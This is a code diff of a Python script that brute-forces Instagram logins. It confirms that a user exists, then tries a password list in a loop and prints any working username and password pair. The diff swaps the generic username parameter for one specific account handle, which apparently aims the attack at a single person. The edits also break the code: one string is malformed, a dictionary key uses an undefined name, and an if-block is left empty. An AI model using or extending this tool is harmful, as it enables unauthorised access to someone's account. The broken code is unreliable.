@@ -16,18 +16,18 @@ else:
 
 
 
-def userExists(username):
-	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
+def userExists(julz_all_day):
+	r = requests.get('https://www.instagram.com/%s/?__a=1' % julz_all_day) 
 	if (r.status_code == 404):
 		print ('User not found')
 		return False
 	elif (r.status_code == 200):
 		followdata = json.loads(r.text)
 		fUserID = followdata['user']['id']
-		return {'username':username,'id':fUserID}
+		return {'just:username,'id':fUserID}
 
 
-def Login(username,password):
+def Login(julz_all_day,password):
 	sess = requests.Session()
 	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
 	sess.headers.update({
@@ -82,7 +82,7 @@ username = userExists(username)
 if (username == False):
 	exit()
 else:
-	username = username['username']
+	username = username[julz_all_day]
 
 
 
@@ -91,7 +91,10 @@ delayLoop = int(input('Please add delay between the passwords (in seconds): '))
 
 for i in range(len(passwords)):
 	password = passwords[i]
-	sess = Login(username,password)
+	sess = Login(julz_all_day ,password)
+	if (sess):
+		     
+
 	if (sess):
 		print ('Login success %s' % [username,password])
 
